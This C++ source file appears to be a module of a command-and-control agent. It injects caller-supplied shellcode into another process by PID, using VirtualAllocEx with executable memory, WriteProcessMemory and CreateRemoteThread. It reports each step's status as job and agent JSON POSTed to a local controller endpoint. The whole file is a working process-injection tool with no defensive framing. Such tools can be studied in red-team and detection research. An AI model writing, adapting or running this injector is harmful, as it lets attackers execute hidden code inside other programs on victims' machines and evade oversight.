#include "http.h"

int main(int argc, char* argv[]) {
    std::string outData = "";

	if (argc != 3) {
		//printf("[ERROR] Invalid argument/s.\n");
        //printf("[INFO] Usage: ...\\injection.cpp [pid] [shellcode]\n");
        outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'injection.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Usage: ...\\injection.cpp [pid] [shellcode]\'}";
        makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
        return 0;
    }

    // Get process by PID
    int pid = std::stoi(argv[1]);
    HANDLE pHandle = OpenProcess(
    	PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
    	FALSE,
    	pid);

    if (!pHandle) {
    	//printf("[ERROR] Could not open requested process.\n");
        outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'injection.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not open requested process.\'}";
        makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
    	return 0;
    }

    // Allocate memory
    int bufSize = 8192; // Arbitrary buffer size, can be adjusted
    LPVOID buf = VirtualAllocEx(
    		pHandle,
    		NULL,
    		bufSize,
    		MEM_COMMIT | MEM_RESERVE,
    		PAGE_EXECUTE_READWRITE
    	);

    if (!buf) {
     	//printf("[ERROR] Could not allocate process memory.\n");
        outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'injection.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not allocate process memory.\'}";
        makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
    	CloseHandle(pHandle);
    	return 0;
    }

    int codeSize = strlen(argv[2]) + 1;
    BOOL memCheck = WriteProcessMemory(
    		pHandle,
    		buf,
    		argv[2],
    		codeSize,
    		NULL);

    if (!memCheck) {
    	// printf("[ERROR] Could not write process memory.\n");
        outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'injection.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not write process memory.\'}";
        makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
    	CloseHandle(pHandle);
    	return 0;
    }

    // Create remote thread, load shellcode
    DWORD threadId;

    HANDLE tHandle = CreateRemoteThread(
    		pHandle,
    		NULL,
    		0,
    		(LPTHREAD_START_ROUTINE)buf,
    		NULL,
    		GENERIC_EXECUTE,
    		&threadId);

    if (!tHandle) {
    	// printf("[ERROR] Could not create remote thread.\n");
        outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'injection.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not create remote thread.\'}";
        makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
    	CloseHandle(pHandle);
    	return 0;
    }

    outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'injection.exe\', \'status\': \'SUCCESS\', \'output\': \'[INFO] Sending remote thread...\'}";
    makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);

    // Wait for thread to finish
    DWORD threadTime = 10; // Time to wait in seconds, can be adjusted
    DWORD threadCheck = WaitForSingleObject(
    		tHandle,
    		threadTime * 1000);

    outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'injection.exe\', \'status\': \'SUCCESS\', \'output\': \'[INFO] Remote thread finished.\'}";
    makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);

    // Cleanup
    VirtualFreeEx(
    	pHandle, 
    	buf, 
    	0, 
    	MEM_RELEASE);

    CloseHandle(pHandle);
    CloseHandle(tHandle);

	return 0;
}